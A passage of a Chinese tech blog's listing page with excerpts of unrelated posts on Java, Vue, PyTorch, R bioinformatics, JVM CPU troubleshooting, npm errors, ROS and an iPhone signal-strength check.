public void platfromLogin(){ if(!loginThread.isAlive()){ if(loginThread.getState()== Thread.State.NEW||loginThread.getState()== Thread.State.TERMINATED){ loginThread =new Thread(()-&gt;platformLoginThread()); loginThread.start(); } } } private void platformLoginThread(){ try{ int num = 0; while (num &lt;= 2){ if(platformReady||loginThread.isInterrupted()){ return; } num++; log.info("发送企业登陆第{}次",num ); this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6ba2da9075846005223fa59d1f4d99b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ad4e8f04f98180db3ba98bb682a514d/" rel="bookmark">
			iphone查看手机信号强度教程「iphone技巧」
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		iPhone手机升级系统不会影响手机信号，有很多果粉表示自己升级系统后iPhone信号变差了，其实iPhone的信号和系统关系并不大，主要取决于手机所处位置网络状况以及基带型号。
怎么样查看iPhone的信号强度呢？大家可以用下面的方法简单自测一下。
打开iPhone的拨号界面，在拨号键中输入*3001#12345#*，然后点击拨号按钮，如果显示的是FieldTest，说明使用的是高通基带，如果显示MainMenu说明使用的是英特尔基带。
高通基带查看信号值方法：点击ServingCellMeasurements，MeasuredRSSI显示的数字反映了当前手机信号强度。
英特尔基带查看信号值方法：依次点击LTE- ServingCellMeas，rsrp0后面的数字反映的就是当前信号强度。
因为dBm是通过对数计算出来的，所以dBm一般都是负数，也就是说信号参数的绝对值越小信号越好。
- 40至- 60之间，正常在基站附近，信号非常好；
- 60至- 70之间，信号属于良好；
- 70至- 80之间，属于信号一般；
- 80至- 90之间，属于信号稍弱；
- 90至- 100之间，属于较弱状态，不过基本可以正常通讯；
- 100至- 110之间，属于信号较差，可能会偶尔突然断线；
如果信号的绝对值大于110的话，基本就没什么信号，电话都打不出去的那种，更别提上网了。
我们可以在升级系统前后分别通过以上方式来测试iPhone的信号强度，就知道手机系统会不会影响信号了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d6e31e9436976dbfb913ebf29cdc62e/" rel="bookmark">
			记一个httpservletrequest接受不到参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上图这种的貌似就接不到
需要前端改成这种
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4923f5293b26120b7c37349c199702e/" rel="bookmark">
			Vol.1 人鼠基因转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vol.1 人鼠基因转换 "像清风追着流云 望你时忽远忽近"
0x00 写在前面 ​ 又开了一个系列新坑, 这一系列的文章主要面向生物信息学, 尝试着从R和统计开始, 自己边学边写, 把遇到的一些问题展现出来.
​ 这一系列可能会要求有R/生物信息学最基本的基础了解就够了,当然如果还不懂可以去公众号三文鱼卷, 搜索"科研工具箱 "话题下相关内容.
0x01 问题的提出 ​ 如果处理的是小鼠的基因芯片表达矩阵，最后做gsea等分析要对生物学数据库注释，发现绝大部分数据库都是人类的基因名字，有一个取巧的方法是把基因名字修改一下，如下所示：
[1] "PTPRC" "EPCAM" "MME" "CD3G" "CD3E" "CD68" "CD79A" # 人基因 [1] "Ptprc" "Epcam" "Mme" "Cd3g" "Cd3e" "Cd68" "Cd79a"	# 鼠基因 ​ 然而,不同物种的基因对应关系是有相应的同源基因数据库的，不能仅仅是把基因名字修改。回归教程本身，人鼠基因转换之首字母大写在R语言的师兄，本着不想自己去造轮子的心态，搜索了一下：发现了好多解决方案.
​ 但是对于人和鼠的基因来说，人的基因多数是大写字母表示，而鼠是同源基因多数是首字母大写，其余字母小写。但仅仅首字母大写并不能完全实现人鼠基因转换。可以找到一一对应的基因列表，进行转换。因此本文使用其他方法进行人鼠基因的转换
0x02 转换方法 ​ 目前有的方法主要是大小写转换, 正则表达式匹配等, 但存在如TP53(human) 对应 Trp53(mouse)的情况. 为了解决这一问题, 还是要回到公共数据库进行检索匹配. 使用R包biomaRt进行.
library("biomaRt") #install ? ms.gene &lt;- c("Ptprc","Epcam", 'Mme',"Cd3g", "Cd79a","Trp53") # 用于转换的基因 listDatasets(useMart("ensembl")) # 查看ensembl数据库中可用的生物数据集 human=useMart("ensembl","hsapiens_gene_ensembl")	#检索到人类数据集 mouse=useMart("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4923f5293b26120b7c37349c199702e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a34dc72a2150cc39cfe205de54660ed/" rel="bookmark">
			vue&#43;elementUI实现滚动加载请求接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求如图所示：
由于图片较大，一次全把数据请求回来难免会太慢，就需要滚动加载请求数据。
实现：element组件：InfiniteScroll 无限滚动
主要代码如下：
&lt;template&gt; &lt;div class="route-wrapper"&gt; &lt;ul v-infinite-scroll="infiniteScroll" // 在要实现滚动加载的列表上上添加v-infinite-scroll，并赋值相应的加载方法，可实现滚动到底部时自动执行加载方法。 :infinite-scroll-disabled="routeLoad || noMore" // 是否禁用(数据到最后时，禁止滚动加载) :infinite-scroll-distance="5" // 触发加载的距离阈值，单位为px class="all-route"&gt; &lt;li v-for="(item, index) in routeData" :key="index" class="route-item"&gt; ... &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import { getAirlineList } from '@/api/route'; export default { name: 'AllRoute', data() { return { routeData: [], noMore: false, // 控制滚动禁用 routeLoad: false, // 控制滚动禁用 pageNo: 0, // 页码 pageSize: 6 // 一页6条 }; }, methods: { // 滚动加载方法 infiniteScroll() { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a34dc72a2150cc39cfe205de54660ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e81183eb7abe1e31f5e060c9f632944/" rel="bookmark">
			string篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
构造函数原型：
赋值重载函数 = assign
拼接函数原型 += append
查找和替换函数原型 find replace
字符串比较函数 compare
字符存取 [] at
插入和删除字符串 insert erase
获取子串 substr
string本质使一个类，类内封装了char *（字符串指针）
构造函数原型： string(); //空字符串
string(const char* s); //通过字符串初始化
string(const string&amp; str); //（构造函数）通过string对象实例化另一个string对象
string(int n,char c); //使用n个字符初始化
赋值重载函数 = assign string&amp; operator=(const char* s);//char*类型字符串赋值给当前的字符串
string&amp; operator=(const string &amp;s);//把字符串s赋给当前的字符串
string&amp; operator=(char C): //字符赋值给当前的字符串
string&amp; assign(const char *S);//把字符串s赋给当前的字符串
string&amp; assign(const char *s, int n); //把字符串s的前n个字符赋给当前的字符串
string&amp; assign(const string &amp;s); //把字符串s赋给当前字符串
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e81183eb7abe1e31f5e060c9f632944/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9fa7eec9b04ccd6b1fb9ee379ff976fc/" rel="bookmark">
			庖丁解牛——用纯python构建深度学习框架(三)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导语 在上一篇中我们简单介绍了神经网络的样子，以及通过拓扑排序和反向传播实现自动求导，但是那只是停留在概念层面，那么接下来就是用代码实现拓扑排序，以及模拟神经网络的计算过程
实现拓扑排序 先提一点，实际上在python3.9的版本上已经有了拓扑排序的功能，如果是使用python3.9版本的同学可以在python官网查看相关文档调取使用，因为我是用的是python3.8版本，所以需要手动实现拓扑排序的功能。
再理一下流程。如下图
x , k 1 , b 1 x,k_1,b_1 x,k1​,b1​把值输入到 L 1 ( ) L_1() L1​()，之后进行非线性变换，把 L 1 ( ) L_1() L1​()的结果输出到 s i g m o i d ( ) sigmoid() sigmoid(),之后再把非线性变换结果和第二次线性变换的参数 s i g m o i d ( x ) , k 2 , b 2 sigmoid(x),k_2,b_2 sigmoid(x),k2​,b2​输入到 L 2 ( ) L_2() L2​()之后再把最后的结果和 y y y值输入到 L o s s ( ) Loss() Loss()函数得到损失值，然后根据 L o s s Loss Loss值反向传播，不断优化参数，再进行向前传播继续得到 L o s s Loss Loss值，如此往复，最终得到模型。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9fa7eec9b04ccd6b1fb9ee379ff976fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42352dee8df93d7f1ad38676313828a1/" rel="bookmark">
			女朋友让我写 1 万字检讨
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前几天老逛惹女朋友生气了，她说让我写一万字的检讨。
一万字，这谁能顶得住？老逛活了这么多年，写过最多的字还是高考作文，这一万字让我怎么憋出来？肯定不能自己写，先去看看有没有“轮子”。
01. 狗屁不通文章生成器
这时候我就去 GitHub 逛了逛，搜索：文章生成器，有一个开源项目格外抢眼，就是它了：狗屁不通文章生成器。
地址：https://github.com/menzi11/BullshitGenerator 狗屁不通四个字注入了我的灵魂，女朋友就是用这四个字骂我的。如果狗屁不通的老逛用着狗屁不通的文章生成器写出来的检讨是什么样的？会不会更加狗屁不通？
我开始写了。打开狗屁不通文章生成器，输入主题「检讨」，点击生成，写完了。
第一句话就把我笑尿了。 “ 我认为，我们都知道，只要有意义，那么就必须慎重考虑 。” 知道的以为我在写检讨，不知道的还以为我要提分手。
后面还有更搞笑的。“ 一般来说，黑格尔曾经提到过，只有永远躺在泥坑里，才不会再次掉进泥坑里。” 大哥，我这是在写检讨呢，这句话出来就是死不认错了呗？只要老逛永远处于错误中，就不会再次犯错？
再往后看：“ 所谓检讨，关键是检讨需要如何写，在这种困难的抉择下，本人思来想去，寝食难安。” 哈哈哈哈，真的是狗屁不通废话生成器。 我换了一个主题，输入「好好学习」，点击生成。
“ 我们不得不面对一个非常尴尬的事实，马云曾经说过 ... ”
好家伙，我要写好好学习的文章，马云都搬出来了。
当我输入主题「逛逛GItHub」，自动生成的文章就更魔幻了。
狗屁不通文章生成器除了用来对付女朋友，还有其它的用处，比如对付某些官僚气息严重的学生会。
如果学生会主席让你提交一篇万字的退会申请书才批准退会，这个神器便能派上用场，输入主题「学生会退会」，点击生成。
第一句话就会把你震惊，也会让学生会主席看傻。“ 这种事对本人来说意义众大，相信对这个世界也是有一定意义的。”
“ 学生会退会，发生了会如何，不发生又会如何。” 真的是狗屁不通废话生成器。
02. 工作原理
这个狗屁不通文章生成器项目最初的目的是用于中文文字 GUI 开发时测试文本渲染，用 Python 3 版本写成，目前共有 7 位贡献者。 这个项目并未用到 AI 相关算法，只是简单地撸代码就可以达到效果。
“狗屁不通生成器”是一个文本生成器，此项目的目的只是用于 GUI 开发时测试文本渲染，所以对文本的连贯性和含义要求不高，这也就是“狗屁不通”的含义了
if __name__ == "__main__": xx = input("请输入文章主题:") for x in xx: tmp = str() while ( len(tmp) &lt; 6000 ) : 分支 = random.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/42352dee8df93d7f1ad38676313828a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c0cbda1c2aae4157718c116f7f75e41/" rel="bookmark">
			免费测试色盲小游戏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		链接地址：https://game.ioxapp.com/eye-test/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f0f1bc46c2fbd1d316a9ad20ebe0594/" rel="bookmark">
			AD15布线时焊盘和导线都成绿色--原因
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用AD15给PCB布线时，焊盘和导线都成绿色，如下图：
后来，找到原因，使用的菜单错了（放置-&gt;走线），正确是“放置(P)-&gt;交互式布线（T）”，快捷键P+T,
或用快捷图标，如下图：
使用P+T,即用“交互式布线” ，正确如下图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98b1c63153f499306c2179b034f856d5/" rel="bookmark">
			vue-element-admin使用 npm install安装依赖时报错 npm ERR! Error while executing:
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇文章带来的内容是解决在vue-element-admin安装依赖时的报错，笔者亲测有效，希望对你有所帮助
在使用npm install下载依赖时，笔者首先遇到的问题如下：
npm ERR! Error while executing:
npm ERR! D:\git\Git\cmd\git.EXE ls-remote -h -t https://github.com/nhn/raphael.git
npm ERR!
npm ERR! fatal: unable to access ‘https://github.com/nhn/raphael.git/’: OpenSSL SSL_read: Connection was reset, errno 10054
npm ERR!
npm ERR! exited with error code: 128
npm ERR! A complete log of this run can be found in:
npm ERR! C:\Users\new\AppData\Roaming\npm-cache_logs\2021-09-08T01_40_03_853Z-debug.log
10054
这样就是网络不好，可以更换一个网络之后再重新下载依赖，笔者在更换网络之后重新下载，又遇到了另一种报错，如下：
npm ERR! Error while executing:
npm ERR! D:\git\Git\cmd\git.EXE ls-remote -h -t https://github.com/nhn/raphael.git
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98b1c63153f499306c2179b034f856d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee8fa520c31ccba3cbf4976819403a5a/" rel="bookmark">
			while、dowhile和for循环
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		循环 循环是指在程序中需要重复执行的一组语句
循环由循环条件和循环操作组成
循环条件：Boolean或结果为布尔类型的判断体
循环操作：循环中被重复执行的操作
一、while循环 特点：先判断，后执行
符合循环条件，循环继续执行；否则，循环退出
while ( 循环条件 ) {
// 循环操作 }
二、dowhile循环 特点：先执行，再判断
先执行一遍循环操作。符合条件，循环继续执行；否则，循环退出
do {
循环操作 （循环操作至少执行一次）
} while ( 循环条件 ); （这里的分号不可少）
while和dowhile的区别 1. 语法不同
2. 执行次序不同
3. 初始情况不满足循环条件时
while循环一次都不会执行
do-while循环不管任何情况都至少执行一次
程序调试的主要方法包括设置断点、单步运行和观察变量
三、for循环 特点：先判断，再执行
条件为true，循环体被执行
for( ①参数初始化；②条件判断；④更新循环变量 ){
③循环操作
}
for( int i=0；i&lt;=10；i++ ){
System.out.println("我是循环的第"+i+"个元素");
}
循环次数确定的情况，通常选用for循环
循环次数不确定的情况，通常选用while或do-while循环 四、break和continue break break常用于switch结构和循环结构中
作用： 用于do-while、while、for中时，终止循环而执行循环后面的语句，改变程序控制流
while(…) {
……
……
……
break;
……
……
……
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee8fa520c31ccba3cbf4976819403a5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bdb836a4e396287bbcab3c335dd9ebb2/" rel="bookmark">
			vue 4.xx.xx版本降级至2.9.6
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		步骤1：执行命令 npm uninstall @vue/cli -g
步骤2：npm config ls -l
查找信息【userconfig = “C:\Users\Adminis\.npmrc”】该路径是Npm配置文件路径,需要将改文件删除
步骤3：where vue
若有信息则将vue vue.cmd两个文件放到其他文件夹 或者删除；
若执行为以下结果，则执行步骤4；
步骤4：npm uninstall @vue/cli -g
即再次执行卸载 命令
步骤5：npm install --global vue-cli@2.9.6
安装想要的版本2.9.6
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8b1d66c8e95d61e3a12ddcfad7ae778/" rel="bookmark">
			Pytorch 对张量进行随机采样
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 更多pytorch操作见：
Pytorch学习之torch
python选取tensor某一维_Pytorch的Tensor操作(1)
如何对张量进行随机采样 假设我目前的张量的shape为 [ B , N , C ] = [ 32 , 512 , 64 ] [B,N,C] = [32,512,64] [B,N,C]=[32,512,64]，N表示点的数量，我要从中随机选取S个点，且为不重复采样。
a = torch.randn((32,512,64)) print(a.shape) # torch.Size([32, 512, 64]) B,N,C = a.shape S = 64 index = torch.LongTensor(random.sample(range(N), S)) print(index) b = torch.index_select(a, 1, index) print(b.shape) # torch.Size([32, 64, 64]) 如果想要截取 [ B , S ] [B,S] [B,S]的话，可以使用“ …”：表示同时取多个维度，只能全选或已知前后具体采样维度，剩下的全选，某一维度取“1”时，会自动降维。
b = torch.index_select(a[..., 0], 1, index) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c36ef88de9f2242aa0bc9f072846ddb1/" rel="bookmark">
			部署华为云示例上云项目，基于Springboot的论坛实例，的故事
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		等了n天的身份认证，终于验证成功，然后开始蛋疼的为了拿优惠卷的实例部署（虽然感觉还是用不到，毕竟只买一台的话，新人价也就400，优惠卷是500起步）
首先是蛋疼的华为云devcloud，这个只支持git上传，由于当时是在学校开始进行，所以只能当场下git，然后用命令行上传，一直卡死，简直有毒，最后算是在蛋疼中完美度过无聊的学校程序课。
回到家后用vcode一下就上传了，然后开始第一个坑，服务器系统，由于只限于window系统可以选择，我就按照默认选了个2008的，结果到了服务器授信的时候，需要用上古ie下载更新3个补丁包，我死了。
第二个坑就是devcloud的程序构建，由于模板里mysql服务器是用//之后接中文写的测试地址几个大字，我以为是注释直接复制了我的服务器ip上去，结果后开才发现，那个//是必须语法，而且前面不能有空格。
第三个坑是devcloud的部署，按着教程走的话，你会看到虽然是liunx地址，但神奇的是在jdk安装的时候能跑，但springboot运作的时候疯狂挂，所以你需要手动加c：去修改，并且记得jdk布置好之后，2008还主要手动点jdk去安装java环境。
第四个坑就是之前那个mysql文件，她教程里面mysql服务器是内网地址简直蛋疼，需要自己买个弹性ip，按量就行了1g，0.02块左右，绑定再改ip连上。
第五个坑是没告诉你的要改入网规则，她只是提醒要加数据库连服务器的端口，30xx来着，但是你根据任务要求要连外网的话，还需要加8080入规则才能进行。
最后模板终于搞好了，里面有原作者的github，发现其实还是半成品，甚至华为云给出来的还是更早之前慢慢bug的模板，原本打算直接用的论坛，还是放弃了。
不过华为云的服务真的好，工单凌晨提交，下午就有人打给我来远程帮忙，甚至出现问题还拉了另外相关的几个来帮忙，真的谢谢了✔
顺便由于原服务器没钱了，所以打算服务器先不搞，虽然原
知乎 - 安全中心​justgugu.com
域名还在，但是已经是无法进入了
最后希望华为云能修改好教程，别挖坑了，望天，虽然也因为之前负责教程的那个人离职了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/707c34a76ad69a82e09448d21f614e34/" rel="bookmark">
			element ui @selection-change多选对数据的操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;template&gt; &lt;div&gt; &lt;el-row class="top-block padding-20px" :gutter="40"&gt; &lt;el-col :xs="24" :sm="12" :lg="6"&gt; &lt;el-row type="flex" class="row-bg" justify=""&gt; &lt;el-col :xs="6" :sm="6" :lg="6" class="flex-align-center"&gt; &lt;label for=""&gt;激活码：&lt;/label&gt; &lt;/el-col&gt; &lt;el-col :xs="18" :sm="18" :lg="18"&gt; &lt;el-input v-model="input" placeholder="请输入内容"&gt;&lt;/el-input&gt; &lt;/el-col&gt; &lt;/el-row&gt; &lt;/el-col&gt; &lt;el-col :xs="24" :sm="12" :lg="6"&gt; &lt;el-row type="flex" class="row-bg" justify=""&gt; &lt;el-col :xs="6" :sm="6" :lg="6" class="flex-align-center"&gt; &lt;label for=""&gt;分配经销商：&lt;/label&gt; &lt;/el-col&gt; &lt;el-col :xs="18" :sm="18" :lg="18"&gt; &lt;el-input v-model="admin" placeholder="请输入内容"&gt;&lt;/el-input&gt; &lt;/el-col&gt; &lt;/el-row&gt; &lt;/el-col&gt; &lt;el-col :xs="24" :sm="12" :lg="6"&gt; &lt;el-row type="flex" class="row-bg" justify=""&gt; &lt;el-col :xs="6" :sm="6" :lg="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/707c34a76ad69a82e09448d21f614e34/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7e665db6269a666a170ee7835e7b485/" rel="bookmark">
			支持给手机充电（快充）的无线领夹麦克风解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在生活中，需要用到无线领夹麦克风的应该场景，越来越多，比如网红直播，网课教学，采访录音，视频录制，视频会议等等。然而，目前的手机基本都已取消Audio3.5耳机接口，要实现音频或者麦克风功能，只能通过手机上面仅有的Type-C接口来连接，同时，这个手机上面仅有的Type-C接口也是给手机充电的接口。那么，这种支持给手机充电（快充）的无线领夹麦克风解决方案是不是可以解决很多问题，避免跟多尴尬的场面呢，比如，直播的时候，手机没电了。再比如，视频会议的时候，手机没电了。这些都可以通过这种支持给手机充电（快充）的无线领夹麦克风解决方案来解决。
LDR6023C，乐得瑞科技推出的USB Type-C PD控制芯片，具备 Power Negotiation 数据包透传功能，切换 Data Role 功能，轻松实现让Type C手机一边充电一边传输数据，达到一边充电一边使用无线领夹麦克风（MIC）的目的，并针对各大手机品牌的 USB-C 兼容性进行了特别优化。
LDR6023C脚位图：
LDR6023C部分电路：
想要更清楚的了解支持给手机充电（快充）的无线领夹麦克风解决方案，请留言交流。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2277abe4108893c8e9ea4aaf3b545d92/" rel="bookmark">
			JVM调优实战场景一，CPU飙升100%
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、CPU异常高
异常代码如下：
@RestController public class IndexController { private static boolean process=true; @RequestMapping("/user/cpu") public String cpu() throws InterruptedException { while(process){ add(3,4); } return "sucess"; } void add(int a,int b){ int r = a + b; } } 在linux启动项目后，服务器情况如下：top命令查看，基本没有什么占用cpu资源的进程
访问如下地址
http://101.132.143.77:8089/user/cpu 服务器cpu飙升
1.1、排查
top命令看到占用cpu最高的进程pid为13861
top -p &lt;pid&gt;，显示你的java进程的内存情况,pid是你的java进程号
top -p 13861 显示如下：
按H，获取每个线程的内存情况
找到内存和cpu占用最高的线程tid，13885，转为十六进制得到363d，此为线程id的十六进制表示。
执行jstack pid | grep -A 10 tid 得到线程堆栈信息中363d这个线程所在行的后面10行，从堆栈中可以发现导致cpu飚高的调用方法
jstack 13861|grep -A 10 363d 结果如下：
定位到代码位置：com.jvm.IndexController.cpu
定位到问题代码，死循环，造成cpu飚高。
jstack是java虚拟机自带的一种堆栈跟踪工具，用于打印出给定的java进程id或core file或远程调式服务的java堆栈信息，主要分为两个功能：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2277abe4108893c8e9ea4aaf3b545d92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec316db61a648f07b5f4dfa3ad62701f/" rel="bookmark">
			神经网络一 | ImageNet Classification with Deep Convolutional Neural Networks
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 大量数据集与大规模网络训练 1.1 个人简单理解 该文章设计目的是能够学习大规模，高分辨率的图像数据集且具备足够学习能力的网络。
如此一来就免不了对网络的宽度和深度有较高的要求，与此同时网络参数的数量和计算量也是庞大的。
作者首先确定使用CNNs的架构，这样做减少了神经层之间的连接以及参数量，便于训练，且性能相比标准的具有相似尺寸大小的网络层的前馈神经网络只是轻微的下降。之后作者在框架中引入了几个设计，如ReLU的使用，数据集的扩增等等，提高了CNN网络的性能，还有就是GPU的使用硬性保证了大规模网络能够train起来。
二 框架学习 先展示神经网络框架：五个卷积层和三个全连接层
【网络分析】
输入为224×224×3的图像
卷积层1的卷积核为11×11×3，strde=4，每个GPU内（2.2讲解）输出55×55×48，响应规范化（2.3节内容），池化（2.4节内容）
卷积层2：256个卷积核，大小为5×5×48；响应规范化，池化
卷积层3，4：384个卷积核，大小为3×3×256；无池化
卷积层5：256个卷积核，大小为3×3×192
全连接层6，7：每个GPU内有2048个神经元，共4096个
全连接层8：输出与1000个softmax相连
输出：关于1000个类的分布
具体网络各详细参数的分析可以参考另一篇博文，讲的很详细：
https://blog.csdn.net/zziahgf/article/details/79619059
本文主要讲了设计的框架的四个新颖的特点，并按重要性顺序展开讲述
2.1 激活函数 —— 使用ReLU 作者用非饱和非线性函数（non-saturating nonlinearity）:
替代了饱和非线性函数（saturating nonlinearities）,如,在网络中作为激活函数的作用。
作者用实验来证明：在达到相同训练误差的情况下，使用前者的速度要比后者快了六倍
2.2 用多块GPU训练 作者从单块GPU的内存太小，而网络较大无法放下的角度出发，提出用两块GPU来训练
【优点】
允许大规模的神经网络的设计
【训练模式】
大部分训练阶段，每个GPU都计算自己对应的那一部分网络里的数据，即网络的下一层输入是上一层的输出，都存储在同一个CPU内。
只有在卷积层的第三层需要输出的交互（即第三层的输入是两个GPU内第二卷积层输出在第三维度上的堆叠），以及全连接层。
2.3 局部响应规范Local Response Normalization 当神经元是ReLUs时，只要神经元的输入是正的，那么就会有输出，也就能继续学习（神经元输入为负时，输出为0，相当于这个神经元‘失活’了，无法参与网络的训练）。
下面提出的方法有助于泛化（generalization）
假设在某一个卷积层有N个卷积核，在同一空间位置下，令表示该位置使用第i个卷积核，并通过ReLU计算后的结果，称为activity of a neuron，n是邻接的卷积核的数量，这种响应规范是受生物上神经元侧抑制的启发，增加神经元输出之间的竞争。称为response-normalized activity。
【参数】
由一组验证集确定得到的
2.4 重叠池化 传统池化的方法中，被池化的区域都是不相交的，设被池化区域为 ，池化层是由以s个像素为间隔的网格，其满足。
当时，池化就产生了重叠，池化的像素可能是由多个区域拼成的。
【效果】
实验结论是可以降低0.4%的top-1 error和0.3%的top-5 error
3 对抗过拟合 3.1 数据扩增Data Augmentation 3.1.1 enlarge the dataset using label-preserving transformations
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec316db61a648f07b5f4dfa3ad62701f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f984ff0d760df3960a4f9cd0179cca31/" rel="bookmark">
			【数据结构】设F是一个森林，B是由F变换得的二叉树。若F中有n个非终端结点，则B中右指针域为空的结点有多少个
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在森林的每一颗子树中，转化二叉树后右指针域为空代表着这个节点是兄弟组的最后一个，再往右没有兄弟了。所以有多少个兄弟组就有多少右指针域为空。每个兄弟组都有自己的父亲，父亲就是非终端结点（分支结点）。
所以每棵子树转化后右指针域为空的结点树等于非终端结点（分支结点）。
又因为所有根结点转化后，最右边的根结点右指针域也为空。
所以最终转化后右指针域为空的结点总数为：
非终端结点数+1。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dcb116fb96ae1356be40fd70a37d78c7/" rel="bookmark">
			使用Ros自带的Pcl
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、CMakeList的编写二、vscode调试总结最后 前言 安装ros 的时候 会自动安装下载libpcl-1.8 这个版本还算比较新的，虽然但是最新的 pcl 已经发展到了 pcl - 1.12 。
那为什么要用Ros安装时自带的pcl呢？ 因为简单方便， 不用再从源码编译新版本，也不用管理什么依赖冲突。 我反正觉得这个东西很烦。。。。。。
提示：以下是本篇文章正文内容，下面案例可供参考
一、CMakeList的编写 cmake_minimum_required(VERSION 3.0.0) project(find_center) find_package(PCL REQUIRED) include_directories( ${PCL_INCLUDE_DIRS}) link_directories(${PCL_LIBRARY_DIRS}) add_definitions(${PCL_DEFINITIONS}) add_executable(find_center main.cpp) target_link_libraries (find_center ${PCL_LIBRARIES}) install(TARGETS find_center RUNTIME DESTINATION bin) 示例：不懂cmakelist的先去补习
二、vscode调试 编写好cmakelists之后呢 可以在vscode调试， 写程序的时候可能会报错，找不到相应的函数和头文件。
这时需要编写C++编写的配置
具体操作
ctrl+P 打开vscode命令行输入C++ 会看到一个配置C++ json的选项，确认在该文件中 能看到 includepath 默认情况下 只有 workpath 即当前目录 检索 头文件。而安装ros的时候 安装下来的pcl 是无法被检索的， 所以 如果 你不想vscode 报错的额话 ，加上pcl 库的地址。 默认情况下， ros安装时安装下来的pcl在这个位置 这个includepath 的意思是 vscode上编写的源代码 会到这些位置，当你 打开库中某些函数的定义的时候会跳转到该位置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dcb116fb96ae1356be40fd70a37d78c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9e4cda214388c4e54f670d8d446bf22/" rel="bookmark">
			Vue 使用 video 标签实现视频播放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 我们在做项目时常常会碰到要做在页面播放视频的功能，该功能我们可以用video.js来做
关于video.js video.js是一个拥有h5背景的网络视频播放器，同时支持h5以及Flash视频播放（可加载本地静态资源视频以及网络链接视频
